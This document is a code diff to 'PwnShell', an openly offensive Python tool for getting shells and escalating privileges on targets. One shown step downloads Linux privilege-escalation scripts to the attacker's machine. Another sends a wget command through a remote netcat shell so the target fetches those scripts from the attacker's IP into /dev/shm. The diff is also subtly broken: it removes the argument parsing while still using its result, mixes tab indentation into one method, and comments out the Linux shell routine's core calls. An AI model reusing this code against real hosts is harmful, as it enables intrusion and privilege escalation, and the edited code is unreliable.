@@ -47,18 +47,18 @@ class PwnShell:
         ######################################################################
 
     def info(self):
-        info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL': self.domain, '[*]Method':self.method.upper(), '[*]Post Data':self.data,'[*]Payload Type':self.type.upper(), '[*]Request file':self.file, '[*]Use nodejs payloads':self.nodejs}
-        for key, value in info.items():
-            if value:
-                print(f'{key} : {value}')
-        print("\n")
+    	info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL': self.domain, '[*]Method':self.method.upper(), '[*]Post Data':self.data,'[*]Payload Type':self.type.upper(), '[*]Request file':self.file, '[*]Use nodejs payloads':self.nodejs}
+    	for key, value in info.items():
+    		if value:
+    			print(f'{key} : {value}')
+    	print("\n")
     ####################################################################################
     ###################################  LINUX #########################################
 
     def shell_linux(self):  # Default option
         self.info()
-        self.is_valid()
-        self.thread()  # leave it the last one
+        #self.is_valid()
+        #self.thread()  # leave it the last one
 
     #########################################################################################
     ###################################  WINDOWS #########################################
@@ -95,9 +95,9 @@ class PwnShell:
         print('[*]Cloning PrivESC Scripts From Their Repositories... ')
         time.sleep(1)
         print('[*]Uploading Shell Scripts To [/dev/shm] On Target Machine...')
-        os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh , curl https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')
+        os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh 2>/dev/null ; curl https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')
         print('[*]Activating a TTY Shell Using --> [Python3]')
-        time.sleep(5)
+        time.sleep(8)
         nc.send_line(b"export TERM=xterm-256color")
         send = f'''wget -r -P /dev/shm http://{self.ip}:9002/scripts'''
         nc.send_line(send.encode("utf-8"))
@@ -218,17 +218,23 @@ def exit_gracefully():
 
 if __name__ == '__main__':
     try:
-        banner = '''
-            ############################################################## 
-                 __    ____                _____ __         ____    __
-               _/ /   / __ \_      ______ / ___// /_  ___  / / /  _/ /
-              / __/  / /_/ / | /| / / __ \\__ \/ __ \ / _ \/ / /  / __/
-             (_  )  / ____/| |/ |/ / / / /__/ / / / /  __/ / /  (_  ) 
-            /  _/  /_/     |__/|__/_/ /_/____/_/ /_/\\___/_/_/  /  _/  
-            /_/                                                /_/   V 1.0
-                Authors: AbuQasem & AlBalouli
-            ##############################################################  
-            '''
+        banner = ''' 
+
+$$$$$$$\                           $$$$$$\  $$\                 $$\ $$\ 
+$$  __$$\                         $$  __$$\ $$ |                $$ |$$ |
+$$ |  $$ |$$\  $$\  $$\ $$$$$$$\  $$ /  \__|$$$$$$$\   $$$$$$\  $$ |$$ |
+$$$$$$$  |$$ | $$ | $$ |$$  __$$\ \$$$$$$\  $$  __$$\ $$  __$$\ $$ |$$ |
+$$  ____/ $$ | $$ | $$ |$$ |  $$ | \____$$\ $$ |  $$ |$$$$$$$$ |$$ |$$ |
+$$ |      $$ | $$ | $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$   ____|$$ |$$ |
+$$ |      \$$$$$\$$$$  |$$ |  $$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |$$ |
+\__|       \_____\____/ \__|  \__| \______/ \__|  \__| \_______|\__|\__| V 1.0
+########################################################################
+------------------------------------                                                                                
+| Authors: [AbuQasem] & [AlBalouli] |                                              
+------------------------------------                               
+\n   
+
+                                      '''
         print(banner)
         parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
         try:
@@ -239,16 +245,13 @@ if __name__ == '__main__':
             parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', required=True)
         parser.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
         parser.add_argument("-t", "--type", help='Payload Type [windows/linux]', type=str, default='linux')
-        parser.add_argument("-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
+        parser.add_argument("-u", "--url", help='Target url [http/s://localhost:8888/h.php?meow=PWNME]')
         parser.add_argument("-f", "--file", help='Request file')
         parser.add_argument("-n", "--nodejs", help='Use Nodejs Payloads', action='store_true')
         parser.add_argument("-d", "--data", help='Post data')
         parser.add_argument("-c", "--cookie", help='Enter Cookie')
         parser.add_argument("-k", "--header", help='Provide header')
-        parser.add_argument("-m", "--method", help='Request Method',required=True)
-        args = parser.parse_args()
-        ########################################################################
-        ########################## Defining variables ##########################
+        parser.add_argument("-m", "--method", help='Request Method',default='POST')
         pwnshell = PwnShell(args)
         pwnshell.send_payload()
     except KeyboardInterrupt:
